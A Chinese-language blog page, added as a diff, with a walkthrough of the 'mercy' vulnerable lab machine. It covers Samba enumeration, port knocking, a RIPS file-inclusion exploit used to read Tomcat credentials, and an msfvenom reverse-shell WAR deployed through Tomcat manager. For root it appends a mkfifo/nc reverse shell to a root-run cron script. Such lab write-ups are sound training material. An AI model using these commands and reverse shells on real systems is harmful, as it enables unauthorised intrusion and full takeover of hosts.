@@ -1,0 +1,350 @@
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8" />
+    <title>mercy靶机实战 | PR0_M1X 的小站</title>
+    <meta name="author" content="PR0_M1X" />
+    <meta name="description" content="自力更生 艰苦奋斗" />
+    <meta name="keywords" content="CTF" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>PR0_M1X 的小站</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a target="_blank" rel="noopener" href="http://gz.crispsheep.icu:5000/display">
+            <i class="fa-solid fa-eye fa-fw"></i>
+            <span>&ensp;Observe</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;PR0_M1X 的小站</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+                <a target="_blank" rel="noopener" href="http://gz.crispsheep.icu:5000/display">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-eye fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Observe</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>mercy靶机实战</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/3/31
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E7%AC%94%E8%AE%B0/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                笔记
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/Writeup/" style="color: #03a9f4">
+                    Writeup
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #00a596">
+                    网安
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p> 首先进行网络发现，扫描192.168.23.0网段下所有存活主机并获取开放端口。</p>
+<p><img src="image-20250331160817182.png" alt="image-20250331160817182"></p>
+<p>靶机ip为192.168.23.158，开放了一系列端口。奇怪的是，常用的22和80端口被防火墙阻挡了，无法访问。猜测可能有敲门机制什么的。注意到有个8080端口开放访问，这是http代理端口，先从这里看起。另外，还注意到有445端口，这是samba服务，同样作为一个可能的攻击方向。</p>
+<p><img src="image-20250331161237919.png" alt="image-20250331161237919"></p>
+<p>8080端口提示服务器安装了tomcat服务，但是没有获取到什么信息，只知道有两个webapp，但是需要用户名密码验证。现在暂时有点束手无策，那么就dirb爆破一下目录，看看有没有什么新的东西。</p>
+<p>找到了一个robots.txt，访问发现禁止爬虫访问&#x2F;tryharder&#x2F;tryharder。我们访问一下。</p>
+<p><img src="image-20250331161619119.png" alt="image-20250331161619119"></p>
+<p>一串base64。解码一下，指令：</p>
+<pre><code class="bash">echo &quot;base64&quot; | base64 -d
+</code></pre>
+<p>提示有一个用户的密码是password，需要获取用户名。联想到前面还有samba服务，我们对samba服务进行一下枚举。</p>
+<pre><code class="bash">enum4linux -a 192.168.23.158
+</code></pre>
+<p><img src="image-20250331161842760.png" alt="image-20250331161842760"></p>
+<p>告诉我们靶机有4个用户。看一下文件共享情况。</p>
+<pre><code class="bash">smbclient \\\\192.168.23.158\\qiu -U qiu
+</code></pre>
+<p>需要登录，用password作为密码，成功登录。</p>
+<p><img src="image-20250331162206906.png" alt="image-20250331162206906"></p>
+<p>看一下当前目录信息，注意到.private文件夹，继续探索。</p>
+<p><img src="image-20250331162239981.png" alt="image-20250331162239981"></p>
+<p>有这些文件和目录。继续探索</p>
+<p>opensesame里有config文件，get下来</p>
+<p><code>get config</code></p>
+<p>然后查看，是敲门口令，给了一个敲门顺序。</p>
+<p>那就敲一下。</p>
+<pre><code class="bash">knock 192.168.23.158 159 27391 4 -v
+</code></pre>
+<p>然后再nmap一下，80端口就开放了。</p>
+<p>访问192.168.23.158，没什么有用的信息。</p>
+<p>继续目录爆破</p>
+<p>有一个robots.txt，访问。</p>
+<p>禁止爬虫访问了两个路径：&#x2F;mercy和&#x2F;nomercy。逐个访问</p>
+<p>&#x2F;mercy目录没有什么有用的信息，看看nomercy。</p>
+<p>是一个rips服务，版本号为0.53。看一下有没有可利用的漏洞。</p>
+<pre><code class="bash">searchsploit rips 0.53
+</code></pre>
+<p>了解到有一个文件包含漏洞，来看一下如何实现。</p>
+<pre><code class="bash">searchsploit -m php/webbapps/18660.txt
+</code></pre>
+<p>了解到我们需要访问&#x2F;rips&#x2F;windows&#x2F;code.php，有一个file参数可以复现该漏洞。</p>
+<p>加到url上。因为rips被改为了nomercy，同样地把PoC中的rips改为nomercy</p>
+<p><img src="image-20250331164138865.png" alt="image-20250331164138865"></p>
+<p>复现成功。</p>
+<p>前面tomcat的It works页面提示用户配置文件在&#x2F;etc&#x2F;tomcat7&#x2F;tomcat-users.xml中。我们利用这个漏洞访问一下。</p>
+<p><img src="image-20250331164324840.png" alt="image-20250331164324840"></p>
+<p>找到了两个用户：thisisasuperduperlonguser和fluffy，同时知道了这两个用户的密码。</p>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>回到8080端口，然后以thisisasuperduperlonguser的身份登录manager服务。</p>
+<p>找到了个文件上传点，用msfvenom做一个反弹shell挂上去。</p>
+<pre><code class="bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.23.159 LPORT=8888 -f war -o  8888.war
+</code></pre>
+<p>然后看一下要访问的jsp</p>
+<pre><code class="bash">7z l 8888.war
+</code></pre>
+<p><img src="image-20250331164920885.png" alt="image-20250331164920885"></p>
+<p>然后上传并部署。</p>
+<p><img src="image-20250331164957215.png" alt="image-20250331164957215"></p>
+<p>部署好了，准备nc监听。</p>
+<pre><code class="bash">nc -lvnp 8888
+</code></pre>
+<p>然后访问jsp，成功反弹，写个交互</p>
+<pre><code class="bash">python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<p>拿到shell，看看有没有sudo权限。</p>
+<p><code>sudo -l</code>要求输入密码，不知道，放弃。</p>
+<p>联想到前面还有一个fluffy用户，切换到那个用户上看看。</p>
+<p><code>su fluffy</code></p>
+<p>密码是freakishfluffybunny，这是 在前面文件包含那里获取到的fluffy用户的密码。</p>
+<p>登录成功，再尝试sudo -l</p>
+<p>输入密码，发现用户sudo被禁用了。</p>
+<p>那就回家目录，看看有无什么有用信息。</p>
+<p>找到家目录下有个隐藏文件夹.private，里面有个定时服务，权限为777，而且执行权限是root。我们可以在这里挂个反弹shell来获取root权限。</p>
+<pre><code class="bash">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc 192.168.23.159 8888 &gt;/tmp/f&quot; &gt;&gt; timeclock
+</code></pre>
+<p>另一边，挂个监听</p>
+<pre><code class="bash">nc -lvnp 8888
+</code></pre>
+<p>需要稍微等一小会才能监听到。</p>
+<p><img src="image-20250331170949448.png" alt="image-20250331170949448"></p>
+<p>成功提权。</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2020 - 2025 PR0_M1X 的小站
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;PR0_M1X
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
